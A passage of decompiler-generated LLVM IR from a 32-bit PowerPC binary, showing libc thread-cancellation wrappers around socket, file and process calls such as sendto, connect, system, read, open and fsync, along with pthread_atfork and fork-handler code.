  %v3_100130f4 = call i32 @pthread_mutex_init(i32 %v0_100130ec, i32* nonnull %stack_var_-56)
  %v1_100130fc = call i32 @pthread_mutexattr_destroy(i32 %v2_10013094)
  br label %dec_label_pc_10013100

dec_label_pc_10013100:                            ; preds = %dec_label_pc_100130c8, %dec_label_pc_100130dc
  store i32 ptrtoint (i32* @global_var_10013104.974 to i32), i32* @lr, align 4
  %v0_10013100 = call i32 @__pthread_reset_main_thread()
  store i32 ptrtoint (i32* @global_var_10013108.975 to i32), i32* @lr, align 4
  %v1_10013104 = call i32 @__fresetlockfiles(i32 %v0_10013100)
  store i32 268513548, i32* @lr, align 4
  %v1_10013108 = call i32 @__pthread_once_fork_child(i32 %v1_10013104)
  br label %dec_label_pc_10013130

dec_label_pc_10013114:                            ; preds = %entry
  store i32 268513560, i32* @lr, align 4
  %v0_10013114 = call i32 @pthread_mutex_unlock()
  %v0_10013118 = load i32, i32* @r28, align 4
  store i32 %v0_10013118, i32* @r3, align 4
  store i32 268513568, i32* @lr, align 4
  %v0_1001311c = call i32 @pthread_mutex_unlock()
  %v0_10013120 = load i32, i32* @r27, align 4
  store i32 %v0_10013120, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10013128.976 to i32), i32* @lr, align 4
  %v0_10013124 = call i32 @pthread_mutex_unlock()
  store i32 268513580, i32* @lr, align 4
  %v1_10013128 = call i32 @__pthread_once_fork_parent(i32 %v0_10013124)
  br label %dec_label_pc_10013130

dec_label_pc_10013130:                            ; preds = %dec_label_pc_10013100, %dec_label_pc_10013114
  %storemerge.in = phi i32* [ @r31, %dec_label_pc_10013114 ], [ @r25, %dec_label_pc_10013100 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r3, align 4
  store i32 268513588, i32* @lr, align 4
  %v0_10013130 = call i32 @pthread_call_handlers()
  %v0_10013134 = load i32, i32* @r26, align 4
  %v1_10013148 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1001301c)
  %v9_10013148 = extractvalue %0 %v1_10013148, 7
  store i4 %v9_10013148, i4* @cr4, align 1
  ret i32 %v0_10013134

; uselistorder directives
  uselistorder i32 %v2_10013094, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 ()* @pthread_call_handlers, { 1, 0 }
  uselistorder label %dec_label_pc_10013130, { 1, 0 }
  uselistorder label %dec_label_pc_10013100, { 1, 0 }
  uselistorder label %dec_label_pc_100130c8, { 1, 0 }
}

define i32 @vfork() local_unnamed_addr {
entry:
  %v0_10013154 = call i32 @fork()
  ret i32 %v0_10013154

; uselistorder directives
  uselistorder i32 ()* @fork, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @pthread_atfork(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r30, align 4
  store i32 24, i32* @r3, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r28, align 4
  store i32 268513660, i32* @lr, align 4
  %v0_10013178 = call i32 @malloc()
  store i32 268763136, i32* @r9, align 4
  %v3_10013180 = icmp eq i32 %v0_10013178, 0
  store i32 ptrtoint (i32* @global_var_100496d4.965 to i32), i32* %r27.global-to-local, align 4
  br i1 %v3_10013180, label %dec_label_pc_100131ec, label %dec_label_pc_10013194

dec_label_pc_10013194:                            ; preds = %entry
  store i32 268513688, i32* @lr, align 4
  %v1_10013194 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_100496d4.965 to i32))
  %v0_100131a0 = load i32, i32* @r30, align 4
  %v0_100131a4 = load i32, i32* @r31, align 4
  store i32 268513712, i32* @lr, align 4
  %v4_100131ac = inttoptr i32 %v0_100131a0 to i32*
  %v5_100131ac = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_100451d0.966 to i32), i32* %v4_100131ac, i32 %v0_100131a4, i32 0)
  %v0_100131b8 = load i32, i32* @r29, align 4
  %v0_100131bc = load i32, i32* @r31, align 4
  %v1_100131bc = add i32 %v0_100131bc, 8
  store i32 268513736, i32* @lr, align 4
  %v4_100131c4 = inttoptr i32 %v0_100131b8 to i32*
  %v5_100131c4 = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_100451d8.968 to i32), i32* %v4_100131c4, i32 %v1_100131bc, i32 1)
  %v0_100131cc = load i32, i32* @r28, align 4
  %v0_100131d0 = load i32, i32* @r31, align 4
  %v1_100131d0 = add i32 %v0_100131d0, 16
  store i32 268513760, i32* @lr, align 4
  %v4_100131dc = inttoptr i32 %v0_100131cc to i32*
  %v5_100131dc = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_100451d4.967 to i32), i32* %v4_100131dc, i32 %v1_100131d0, i32 1)
  %v0_100131e0 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100131e0, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100131e8.977 to i32), i32* @lr, align 4
  %v0_100131e4 = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_100131ec

dec_label_pc_100131ec:                            ; preds = %entry, %dec_label_pc_10013194
  %v0_100131ec = phi i32 [ 12, %entry ], [ 0, %dec_label_pc_10013194 ]
  ret i32 %v0_100131ec

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_100496d4.965 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100131ec, { 1, 0 }
}

define i32 @sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  store i32 %arg3, i32* %r27.global-to-local, align 4
  store i32 %arg4, i32* %r26.global-to-local, align 4
  store i32 %arg5, i32* %r25.global-to-local, align 4
  store i32 %arg6, i32* %r24.global-to-local, align 4
  %v2_10013228 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268513848, i32* @lr, align 4
  %v3_10013234 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013228)
  %v0_10013238 = load i32, i32* %r28.global-to-local, align 4
  %v0_1001323c = load i32, i32* %r27.global-to-local, align 4
  %v0_10013240 = load i32, i32* %r26.global-to-local, align 4
  %v0_10013244 = load i32, i32* %r25.global-to-local, align 4
  %v0_10013248 = load i32, i32* %r24.global-to-local, align 4
  %v0_1001324c = load i32, i32* %r29.global-to-local, align 4
  store i32 268513876, i32* @lr, align 4
  %v6_10013250 = call i32 @__libc_sendto(i32 %v0_1001324c, i32 %v0_10013238, i32 %v0_1001323c, i32 %v0_10013240, i32 %v0_10013244, i32 %v0_10013248)
  store i32 %v6_10013250, i32* %r29.global-to-local, align 4
  %v3_1001325c = load i32, i32* %stack_var_-56, align 4
  store i32 268513892, i32* @lr, align 4
  %v2_10013260 = trunc i32 %v3_1001325c to i8
  %v3_10013260 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013260, i32 0)
  ret i32 %v6_10013250
}

define i32 @sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013294 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268513956, i32* @lr, align 4
  %v3_100132a0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013294)
  store i32 268513972, i32* @lr, align 4
  %v3_100132b0 = call i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_100132bc = load i32, i32* %stack_var_-40, align 4
  store i32 268513988, i32* @lr, align 4
  %v2_100132c0 = trunc i32 %v3_100132bc to i8
  %v3_100132c0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100132c0, i32 0)
  ret i32 %v3_100132b0
}

define i32 @send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100132f8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514056, i32* @lr, align 4
  %v3_10013304 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100132f8)
  store i32 268514076, i32* @lr, align 4
  %v4_10013318 = call i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_10013324 = load i32, i32* %stack_var_-40, align 4
  store i32 268514092, i32* @lr, align 4
  %v2_10013328 = trunc i32 %v3_10013324 to i8
  %v3_10013328 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013328, i32 0)
  ret i32 %v4_10013318
}

define i32 @recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1001335c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514156, i32* @lr, align 4
  %v3_10013368 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1001335c)
  store i32 268514172, i32* @lr, align 4
  %v3_10013378 = call i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_10013384 = load i32, i32* %stack_var_-40, align 4
  store i32 268514188, i32* @lr, align 4
  %v2_10013388 = trunc i32 %v3_10013384 to i8
  %v3_10013388 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013388, i32 0)
  ret i32 %v3_10013378
}

define i32 @recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  store i32 %arg3, i32* %r27.global-to-local, align 4
  store i32 %arg4, i32* %r26.global-to-local, align 4
  store i32 %arg5, i32* %r25.global-to-local, align 4
  store i32 %arg6, i32* %r24.global-to-local, align 4
  %v2_100133c8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268514264, i32* @lr, align 4
  %v3_100133d4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100133c8)
  %v0_100133d8 = load i32, i32* %r28.global-to-local, align 4
  %v0_100133dc = load i32, i32* %r27.global-to-local, align 4
  %v0_100133e0 = load i32, i32* %r26.global-to-local, align 4
  %v0_100133e4 = load i32, i32* %r25.global-to-local, align 4
  %v0_100133e8 = load i32, i32* %r24.global-to-local, align 4
  %v0_100133ec = load i32, i32* %r29.global-to-local, align 4
  store i32 268514292, i32* @lr, align 4
  %v6_100133f0 = call i32 @__libc_recvfrom(i32 %v0_100133ec, i32 %v0_100133d8, i32 %v0_100133dc, i32 %v0_100133e0, i32 %v0_100133e4, i32 %v0_100133e8)
  store i32 %v6_100133f0, i32* %r29.global-to-local, align 4
  %v3_100133fc = load i32, i32* %stack_var_-56, align 4
  store i32 268514308, i32* @lr, align 4
  %v2_10013400 = trunc i32 %v3_100133fc to i8
  %v3_10013400 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013400, i32 0)
  ret i32 %v6_100133f0
}

define i32 @recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013438 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514376, i32* @lr, align 4
  %v3_10013444 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013438)
  store i32 268514396, i32* @lr, align 4
  %v4_10013458 = call i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_10013464 = load i32, i32* %stack_var_-40, align 4
  store i32 268514412, i32* @lr, align 4
  %v2_10013468 = trunc i32 %v3_10013464 to i8
  %v3_10013468 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013468, i32 0)
  ret i32 %v4_10013458
}

define i32 @connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1001349c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514476, i32* @lr, align 4
  %v3_100134a8 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1001349c)
  store i32 268514492, i32* @lr, align 4
  %v3_100134b8 = call i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_100134c4 = load i32, i32* %stack_var_-40, align 4
  store i32 268514508, i32* @lr, align 4
  %v2_100134c8 = trunc i32 %v3_100134c4 to i8
  %v3_100134c8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100134c8, i32 0)
  ret i32 %v3_100134b8
}

define i32 @accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100134fc = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514572, i32* @lr, align 4
  %v3_10013508 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100134fc)
  store i32 268514588, i32* @lr, align 4
  %v3_10013518 = call i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_10013524 = load i32, i32* %stack_var_-40, align 4
  store i32 268514604, i32* @lr, align 4
  %v2_10013528 = trunc i32 %v3_10013524 to i8
  %v3_10013528 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013528, i32 0)
  ret i32 %v3_10013518
}

define i32 @write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1001355c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514668, i32* @lr, align 4
  %v3_10013568 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1001355c)
  store i32 268514684, i32* @lr, align 4
  %v2_10013578 = call i32 @__libc_write(i32 %arg1, i32 %arg2)
  store i32 %v2_10013578, i32* @r29, align 4
  %v3_10013584 = load i32, i32* %stack_var_-40, align 4
  store i32 268514700, i32* @lr, align 4
  %v2_10013588 = trunc i32 %v3_10013584 to i8
  %v3_10013588 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013588, i32 0)
  %v0_10013590 = load i32, i32* @r29, align 4
  ret i32 %v0_10013590
}

define i32 @waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100135bc = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514764, i32* @lr, align 4
  %v3_100135c8 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100135bc)
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 268514780, i32* @lr, align 4
  %v3_100135d8 = call i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_100135d8, i32* @r29, align 4
  %v3_100135e4 = load i32, i32* %stack_var_-40, align 4
  store i32 268514796, i32* @lr, align 4
  %v2_100135e8 = trunc i32 %v3_100135e4 to i8
  %v3_100135e8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100135e8, i32 0)
  %v0_100135f0 = load i32, i32* @r29, align 4
  ret i32 %v0_100135f0

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013610 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514852, i32* @lr, align 4
  %v3_10013620 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013610)
  store i32 268514860, i32* @lr, align 4
  %v1_10013628 = call i32 @__libc_wait(i32 %arg1)
  %v3_10013634 = load i32, i32* %stack_var_-40, align 4
  store i32 268514876, i32* @lr, align 4
  %v2_10013638 = trunc i32 %v3_10013634 to i8
  %v3_10013638 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013638, i32 0)
  ret i32 %v1_10013628
}

define i32 @tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013660 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268514932, i32* @lr, align 4
  %v3_10013670 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013660)
  store i32 %arg1, i32* @r3, align 4
  store i32 268514940, i32* @lr, align 4
  %v1_10013678 = call i32 @__libc_tcdrain(i32 %arg1)
  %v3_10013684 = load i32, i32* %stack_var_-40, align 4
  store i32 268514956, i32* @lr, align 4
  %v2_10013688 = trunc i32 %v3_10013684 to i8
  %v3_10013688 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013688, i32 0)
  ret i32 %v1_10013678

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100136b0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268515012, i32* @lr, align 4
  %v3_100136c0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100136b0)
  store i32 268515020, i32* @lr, align 4
  %v1_100136c8 = call i32 @__libc_system(i32 %arg1)
  %v3_100136d4 = load i32, i32* %stack_var_-40, align 4
  store i32 268515036, i32* @lr, align 4
  %v2_100136d8 = trunc i32 %v3_100136d4 to i8
  %v3_100136d8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100136d8, i32 0)
  ret i32 %v1_100136c8
}

define i32 @read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1001370c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268515100, i32* @lr, align 4
  %v3_10013718 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_1001370c)
  store i32 268515116, i32* @lr, align 4
  %v1_10013728 = call i32 @__libc_read(i32 %arg1)
  %v3_10013734 = load i32, i32* %stack_var_-40, align 4
  store i32 268515132, i32* @lr, align 4
  %v2_10013738 = trunc i32 %v3_10013734 to i8
  %v3_10013738 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013738, i32 0)
  ret i32 %v1_10013728
}

define i32 @pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  %v2_10013770 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268515200, i32* @lr, align 4
  %v3_1001377c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013770)
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  %v0_1001378c = load i32, i32* %r29.global-to-local, align 4
  store i32 268515220, i32* @lr, align 4
  %v4_10013790 = call i32 @__libc_pwrite(i32 %v0_1001378c, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_10013790, i32* %r29.global-to-local, align 4
  %v3_1001379c = load i32, i32* %stack_var_-40, align 4
  store i32 268515236, i32* @lr, align 4
  %v2_100137a0 = trunc i32 %v3_1001379c to i8
  %v3_100137a0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100137a0, i32 0)
  ret i32 %v4_10013790

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %arg1, i32* %r27.global-to-local, align 4
  store i32 %arg2, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r25.global-to-local, align 4
  store i32 %arg5, i32* %r29.global-to-local, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  %v2_100137dc = ptrtoint i32* %stack_var_-56 to i32
  store i32 268515308, i32* @lr, align 4
  %v3_100137e8 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100137dc)
  %v0_100137ec = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_100137ec, i32* @r4, align 4
  %v0_100137f0 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100137f0, i32* @r5, align 4
  %v0_100137f4 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100137f4, i32* @r7, align 4
  %v0_100137f8 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100137f8, i32* @r8, align 4
  %v0_100137fc = load i32, i32* %r27.global-to-local, align 4
  store i32 268515332, i32* @lr, align 4
  %v5_10013800 = call i32 @__libc_pread64(i32 %v0_100137fc, i32 %v0_100137ec, i32 %v0_100137f0, i32 %v0_100137f4, i32 %v0_100137f8)
  store i32 %v5_10013800, i32* %r29.global-to-local, align 4
  %v3_1001380c = load i32, i32* %stack_var_-56, align 4
  store i32 268515348, i32* @lr, align 4
  %v2_10013810 = trunc i32 %v3_1001380c to i8
  %v3_10013810 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013810, i32 0)
  ret i32 %v5_10013800
}

define i32 @pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  %v2_10013848 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268515416, i32* @lr, align 4
  %v3_10013854 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013848)
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  %v0_10013864 = load i32, i32* %r29.global-to-local, align 4
  store i32 268515436, i32* @lr, align 4
  %v4_10013868 = call i32 @__libc_pread(i32 %v0_10013864, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_10013868, i32* %r29.global-to-local, align 4
  %v3_10013874 = load i32, i32* %stack_var_-40, align 4
  store i32 268515452, i32* @lr, align 4
  %v2_10013878 = trunc i32 %v3_10013874 to i8
  %v3_10013878 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013878, i32 0)
  ret i32 %v4_10013868

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @pause() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100138a0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_100138b0.978 to i32), i32* @lr, align 4
  %v3_100138ac = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100138a0)
  store i32 268515508, i32* @lr, align 4
  %v1_100138b0 = call i32 @__libc_pause(i32 %v3_100138ac)
  %v3_100138bc = load i32, i32* %stack_var_-40, align 4
  store i32 268515524, i32* @lr, align 4
  %v2_100138c0 = trunc i32 %v3_100138bc to i8
  %v3_100138c0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100138c0, i32 0)
  ret i32 %v1_100138b0
}

define i32 @open64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100138f4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268515588, i32* @lr, align 4
  %v3_10013900 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100138f4)
  store i32 268515632, i32* @lr, align 4
  %v3_1001392c = call i32 @__GI___libc_open64(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_10013934 = load i32, i32* %stack_var_-40, align 4
  store i32 268515648, i32* @lr, align 4
  %v2_1001393c = trunc i32 %v3_10013934 to i8
  %v3_1001393c = call i32 @__GI_pthread_setcanceltype(i8 %v2_1001393c, i32 0)
  ret i32 %v3_1001392c
}

define i32 @open(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013970 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268515712, i32* @lr, align 4
  %v3_1001397c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013970)
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 268515756, i32* @lr, align 4
  %v0_100139a8 = call i32 @__libc_open()
  %v3_100139b0 = load i32, i32* %stack_var_-40, align 4
  store i32 268515772, i32* @lr, align 4
  %v2_100139b8 = trunc i32 %v3_100139b0 to i8
  %v3_100139b8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100139b8, i32 0)
  ret i32 %v0_100139a8
}

define i32 @nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v2_100139ec = ptrtoint i32* %stack_var_-40 to i32
  store i32 268515832, i32* @lr, align 4
  %v3_100139f4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100139ec)
  store i32 268515844, i32* @lr, align 4
  %v0_10013a00 = call i32 @__libc_nanosleep()
  store i32 %v0_10013a00, i32* @r29, align 4
  %v3_10013a0c = load i32, i32* %stack_var_-40, align 4
  store i32 268515860, i32* @lr, align 4
  %v2_10013a10 = trunc i32 %v3_10013a0c to i8
  %v3_10013a10 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013a10, i32 0)
  %v0_10013a18 = load i32, i32* @r29, align 4
  ret i32 %v0_10013a18
}

define i32 @msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013a44 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268515924, i32* @lr, align 4
  %v3_10013a50 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013a44)
  store i32 268515940, i32* @lr, align 4
  %v3_10013a60 = call i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_10013a6c = load i32, i32* %stack_var_-40, align 4
  store i32 268515956, i32* @lr, align 4
  %v2_10013a70 = trunc i32 %v3_10013a6c to i8
  %v3_10013a70 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013a70, i32 0)
  ret i32 %v3_10013a60
}

define i32 @lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013a98 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268516024, i32* @lr, align 4
  %v3_10013ab4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013a98)
  store i32 268516044, i32* @lr, align 4
  %v4_10013ac8 = call i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_10013ad0 = load i32, i32* %stack_var_-40, align 4
  store i32 268516064, i32* @lr, align 4
  %v2_10013adc = trunc i32 %v3_10013ad0 to i8
  %v3_10013adc = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013adc, i32 0)
  ret i32 %v4_10013ac8
}

define i32 @lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013b14 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268516132, i32* @lr, align 4
  %v3_10013b20 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013b14)
  store i32 268516148, i32* @lr, align 4
  %v3_10013b30 = call i32 @__GI___libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_10013b3c = load i32, i32* %stack_var_-40, align 4
  store i32 268516164, i32* @lr, align 4
  %v2_10013b40 = trunc i32 %v3_10013b3c to i8
  %v3_10013b40 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013b40, i32 0)
  ret i32 %v3_10013b30
}

define i32 @fsync(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013b68 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268516220, i32* @lr, align 4
  %v3_10013b78 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013b68)
  store i32 268516228, i32* @lr, align 4
  %v1_10013b80 = call i32 @__libc_fsync(i32 %arg1)
  %v3_10013b8c = load i32, i32* %stack_var_-40, align 4
  store i32 268516244, i32* @lr, align 4
  %v2_10013b90 = trunc i32 %v3_10013b8c to i8
  %v3_10013b90 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013b90, i32 0)
  ret i32 %v1_10013b80
}

define i32 @fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10013bc4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268516308, i32* @lr, align 4
  %v3_10013bd0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10013bc4)
  store i32 268516352, i32* @lr, align 4
